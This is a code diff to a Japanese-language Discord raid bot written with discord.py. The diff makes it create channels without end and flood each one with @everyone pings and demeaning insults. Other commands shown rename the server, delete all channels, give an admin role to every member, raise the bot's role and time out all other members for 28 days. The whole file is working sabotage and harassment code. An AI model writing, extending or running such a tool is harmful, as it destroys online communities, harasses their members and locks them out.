@@ -13,8 +13,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-CHANNEL_COUNT = 25
-MESSAGE_LOOPS = 120
+CREATE_INTERVAL = 0.5  # チャンネル作成間隔（秒）
 
 COMBINED_TEXT = (
     "@everyone\n"
@@ -33,6 +32,9 @@ COMBINED_TEXT = (
     "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
 )
 
+# グローバル停止フラグ＋タスク追跡
+stop_flag = asyncio.Event()
+background_tasks = set()
 
 def random_mentions(guild: discord.Guild) -> str:
     members = [m for m in guild.members if not m.bot]
@@ -43,29 +45,82 @@ def random_mentions(guild: discord.Guild) -> str:
     return " ".join(m.mention for m in picked) + "\n"
 
 
-@bot.command()
-async def start(ctx):
-    guild = ctx.guild
+async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
+    """【無限】個別チャンネルにメッセージを送り続けるタスク"""
+    while not stop_flag.is_set():
+        text = random_mentions(guild) + COMBINED_TEXT
+        try:
+            await channel.send(text)
+        except Exception as e:
+            print(f"送信エラー {channel.name}: {e}")
+            break
+        # 停止を確認しながら待機
+        try:
+            await asyncio.wait_for(stop_flag.wait(), timeout=0.1)
+        except asyncio.TimeoutError:
+            pass
+
+
+async def infinite_create_and_spam(guild: discord.Guild):
+    """無限チャンネル作成＋並行無限送信"""
+    stop_flag.clear()
     try:
         await guild.edit(name=SERVER_NAME)
     except:
         pass
 
-    tasks = []
-    for ch in list(guild.channels):
-        tasks.append(ch.delete())
-    await asyncio.gather(*tasks, return_exceptions=True)
+    # 既存チャンネルを全削除
+    delete_tasks = [ch.delete() for ch in guild.channels]
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    tasks = []
-    for i in range(CHANNEL_COUNT):
-        tasks.append(guild.create_text_channel(f"{CHANNEL_NAME}-{i+1}"))
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    new_channels = [ch for ch in results if isinstance(ch, discord.TextChannel)]
+    counter = 1
+    while not stop_flag.is_set():
+        try:
+            new_channel = await guild.create_text_channel(f"{CHANNEL_NAME}-{counter}")
+            print(f"作成: {new_channel.name}")
 
-    for _ in range(MESSAGE_LOOPS):
-        text = random_mentions(guild) + COMBINED_TEXT
-        tasks = [ch.send(text) for ch in new_channels]
-        await asyncio.gather(*tasks, return_exceptions=True)
+            # バックグラウンドで送信タスク起動（即時並行実行）
+            task = asyncio.create_task(spam_channel(new_channel, guild))
+            background_tasks.add(task)
+            task.add_done_callback(background_tasks.discard)
+
+            counter += 1
+            # 停止を確認しながら作成間隔を待機
+            try:
+                await asyncio.wait_for(stop_flag.wait(), timeout=CREATE_INTERVAL)
+            except asyncio.TimeoutError:
+                pass
+
+        except Exception as e:
+            print(f"作成エラー: {e}")
+            try:
+                await asyncio.wait_for(stop_flag.wait(), timeout=3)
+            except asyncio.TimeoutError:
+                pass
+
+    print("✅ 作成ループを終了")
+
+
+@bot.command()
+async def start(ctx):
+    if not ctx.author.guild_permissions.administrator:
+        await ctx.send("⚠️ 管理者権限が必要です")
+        return
+    if stop_flag.is_set() is False and len(background_tasks) > 0:
+        await ctx.send("⚠️ 既に実行中です。停止するには !stop を実行してください")
+        return
+    await ctx.send("🚀 無限作成・無限並行送信を開始します\n⚠️ 止めるには !stop")
+    await infinite_create_and_spam(ctx.guild)
+    await ctx.send("🛑 すべての動作を停止しました")
+
+
+@bot.command()
+async def stop(ctx):
+    """✅ 追加：全ての動作を停止"""
+    stop_flag.set()
+    await asyncio.gather(*background_tasks, return_exceptions=True)
+    background_tasks.clear()
+    await ctx.send("🛑 停止信号を送信しました。全てのタスクは順次終了します")
 
 
 @bot.command()
@@ -80,25 +135,15 @@ async def admin(ctx):
             )
         except:
             return
-
-    tasks = []
-    for m in guild.members:
-        if not m.bot and admin_role not in m.roles:
-            tasks.append(m.add_roles(admin_role))
+    tasks = [m.add_roles(admin_role) for m in guild.members if not m.bot and admin_role not in m.roles]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 
-# ==============================================
-# ✅ !to に全部まとめた！
-# ① 自分に管理者権限付与 → ② Botロールを一番上へ → ③ 全員タイムアウト
-# ==============================================
 @bot.command(name="to")
 async def total_timeout(ctx):
     guild = ctx.guild
     author = ctx.author
     report = []
-
-    # ① 管理者ロールを作成または取得して自分に付与
     admin_role = discord.utils.get(guild.roles, name="TISN管理者")
     if not admin_role:
         try:
@@ -111,7 +156,6 @@ async def total_timeout(ctx):
             report.append(f"❌ 管理者ロール作成失敗: {e}")
             await ctx.send("\n".join(report))
             return
-
     if admin_role not in author.roles:
         try:
             await author.add_roles(admin_role)
@@ -120,20 +164,14 @@ async def total_timeout(ctx):
             report.append(f"❌ ロール付与失敗: {e}")
             await ctx.send("\n".join(report))
             return
-
-    # 権限反映待ち
     await asyncio.sleep(1.5)
-
-    # ② Botのロールを一番上に移動
     bot_top_role = guild.me.top_role
-    target_position = len(guild.roles) - 2  # @everyoneのすぐ下
+    target_position = len(guild.roles) - 2
     try:
         await bot_top_role.edit(position=target_position, reason=f"!to by {author}")
         report.append("✅ Botロールを一番上に移動")
     except Exception as e:
         report.append(f"⚠️ Botロール移動失敗（続行します）: {e}")
-
-    # ③ 自分以外全員を28日間タイムアウト
     duration = discord.utils.utcnow() + timedelta(days=28)
     tasks = []
     target_count = 0
@@ -145,12 +183,9 @@ async def total_timeout(ctx):
             target_count += 1
         except:
             pass
-
     results = await asyncio.gather(*tasks, return_exceptions=True)
     success_count = sum(1 for r in results if not isinstance(r, Exception))
     report.append(f"✅ タイムアウト実行: {success_count}/{target_count} 人")
-
-    # 最終報告
     await ctx.send("## 🎯 !to 完了\n" + "\n".join(report))
 
 
